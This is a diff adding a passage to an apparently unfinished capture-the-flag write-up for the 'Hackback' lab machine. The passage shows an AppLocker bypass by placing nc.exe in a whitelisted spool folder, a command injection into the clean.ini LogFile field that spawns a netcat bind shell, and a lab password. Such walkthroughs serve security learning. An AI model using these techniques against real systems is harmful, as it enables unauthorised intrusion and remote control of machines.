@@ -875,6 +875,78 @@ Info: Establishing connection to remote endpoint
 ```
 
 Equipped with my new and improved shell, I tried to upload `nc.exe` to the machine in an attempt to abuse the aforementioned command injection vulnerability in the `clean.ini` file. 
+<p><br></p>
+
+I was able to upload `nc.exe` to the `C:\Windows\System32\spool\drivers\color` directory to avoid AppLocker using the built-in upload capability of `evil-winrm`. I appended a `cmd.exe` command to call `nc.exe` in the `LogFile` parameter immediately after. 
+
+```bash
+➜  HACKBACK cd www
+➜  www ls -al
+total 56
+drwxr-xr-x 2 root root  4096 Apr 16 17:26 .
+drwxr-xr-x 5 root root  4096 Apr 16 17:26 ..
+-rwxr-xr-x 1 root root 45272 Apr 16 17:26 nc.exe
+➜  www proxychains evil-winrm -u simple -p 'ZonoProprioZomaro:-(' -i 127.0.0.1
+ProxyChains-3.1 (http://proxychains.sf.net)
+
+Evil-WinRM shell v2.0
+
+Info: Establishing connection to remote endpoint
+
++*Evil-WinRM* PS C:\Users\simple\Documents> cd C:\Windows\System32\spool\drivers\color
++*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> upload nc.exe
+Info: Uploading nc.exe to C:\Windows\System32\spool\drivers\color\nc.exe
+
+Data: 60360 bytes of 60360 bytes copied
+
+Info: Upload successful!
+
++*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> dir
+
+
+    Directory: C:\Windows\System32\spool\drivers\color
+
+
+Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
+----                -------------         ------ ----                                                                                                                                                                                                    
+-a----        9/15/2018  12:12 AM           1058 D50.camp                                                                                                                                                                                                
+-a----        9/15/2018  12:12 AM           1079 D65.camp                                                                                                                                                                                                
+-a----        9/15/2018  12:12 AM            797 Graphics.gmmp                                                                                                                                                                                           
+-a----        9/15/2018  12:12 AM            838 MediaSim.gmmp                                                                                                                                                                                           
+-a----        4/16/2020   9:33 PM          45272 nc.exe                                                                                                                                                                                                  
+-a----        9/15/2018  12:12 AM            786 Photo.gmmp                                                                                                                                                                                              
+-a----        9/15/2018  12:12 AM            822 Proofing.gmmp                                                                                                                                                                                           
+-a----        9/15/2018  12:12 AM         218103 RSWOP.icm                                                                                                                                                                                               
+-a----        9/15/2018  12:12 AM           3144 sRGB Color Space Profile.icm                                                                                                                                                                            
+-a----        9/15/2018  12:12 AM          17155 wscRGB.cdmp                                                                                                                                                                                             
+-a----        9/15/2018  12:12 AM           1578 wsRGB.cdmp
+```
+
+I was then able to modify the `clean.ini` file to contain a `cmd.exe` call to `nc.exe` and my listener's port (9001) running over `proxychains`.
+
+```bash
++*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> type C:\util\scripts\clean.ini
+[Main]
+LifeTime=100
+LogFile=C:\util\scripts\log.txt & cmd.exe /c C:\Windows\System32\spool\drivers\color\nc.exe -lvp 9001 -e cmd.exe
+```
+
+And immediately I caught a shell as `hacker`. I'm finally able to view `user.txt`!
+
+```bash
+➜  HACKBACK proxychains nc hackback.htb 9001
+ProxyChains-3.1 (http://proxychains.sf.net)
+Microsoft Windows [Version 10.0.17763.292]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami 
+whoami 
+hackback\hacker
+
+C:\Windows\system32>cd C:\Users\hacker\Desktop & type user.txt
+cd C:\Users\hacker\Desktop & type user.txt
+922449f8e39c2<redacted>
+```
 
 ### Writeup still in progress... Check back later for more!
 
